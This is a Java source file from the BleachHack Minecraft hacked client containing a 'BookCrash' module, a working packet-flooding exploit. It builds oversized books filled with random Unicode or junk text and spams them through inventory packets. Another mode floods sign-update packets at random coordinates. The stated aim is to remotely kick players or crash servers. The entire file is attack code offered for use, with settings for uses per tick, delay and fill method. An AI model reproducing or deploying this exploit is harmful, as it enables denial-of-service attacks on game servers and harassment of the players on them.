/*
 * This file is part of the BleachHack distribution (https://github.com/BleachDev/BleachHack/).
 * Copyright (c) 2021 Bleach and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package org.bleachhack.module.mods;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import org.bleachhack.event.events.EventPacket;
import org.bleachhack.event.events.EventTick;
import org.bleachhack.eventbus.BleachSubscribe;
import org.bleachhack.module.Module;
import org.bleachhack.module.ModuleCategory;
import org.bleachhack.setting.module.SettingMode;
import org.bleachhack.setting.module.SettingSlider;
import org.bleachhack.setting.module.SettingToggle;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.math.BlockPos;

/* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
public class BookCrash extends Module {

	private int delay = 0;

	public BookCrash() {
		super("BookCrash", KEY_UNBOUND, ModuleCategory.EXPLOITS, "Abuses book and quill/sign packets to remotely kick people.",
				new SettingMode("Mode", "Jessica", "Raion", "Sign").withDesc("What method to use."),
				new SettingSlider("Uses", 1, 20, 5, 0).withDesc("How many uses per tick."),
				new SettingSlider("Delay", 0, 5, 0, 0).withDesc("How many ticks to wait between uses."),
				new SettingMode("Fill", "Ascii", "0xFFFF", "Random", "Old").withDesc("How to fill the book."),
				new SettingSlider("Pages", 1, 100, 50, 0).withDesc("How many pages to fill."),
				new SettingToggle("Auto-Off", true).withDesc("Automatically turns the modules off when you disconnect."));
	}

	@BleachSubscribe
	public void onTick(EventTick event) {
		delay = (delay >= getSetting(2).asSlider().getValue() ? 0 : delay + 1);
		if (delay > 0)
			return;

		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
		NbtList list = new NbtList();
		NbtCompound tag = new NbtCompound();
		String author = "Bleach";
		String title = "\n Bleachhack Owns All \n";

		String size = "";
		int pages = Math.min(getSetting(4).asSlider().getValueInt(), 100);
		int pageChars = 210;

		if (getSetting(3).asMode().getMode() == 2) {
			IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
			size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
		} else if (getSetting(3).asMode().getMode() == 1) {
			size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
		} else if (getSetting(3).asMode().getMode() == 0) {
			IntStream chars = new Random().ints(0x20, 0x7E);
			size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
		} else if (getSetting(3).asMode().getMode() == 3) {
			size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
		}

		if (getSetting(0).asMode().getMode() == 2) {
			String text = "bh ontop";
			Random rand = new Random();
			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
				mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
			}
		} else {
			for (int i = 0; i < pages; i++) {
				NbtString tString = NbtString.of(size);
				list.add(tString);
			}

			tag.putString("author", author);
			tag.putString("title", title);
			tag.put("pages", list);

			bookObj.setSubNbt("pages", list);
			bookObj.setNbt(tag);

			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
				if (getSetting(0).asMode().getMode() == 0) {
					Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
					map.put(0, bookObj);

					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
				} else {
					mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
				}
			}
		}
	}

	@BleachSubscribe
	public void EventDisconnect(EventPacket.Read event) {
		if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().getState())
			setEnabled(false);
	}

	private static String repeat(int count, String with) {
		return new String(new char[count]).replace("\0", with);
	}
}
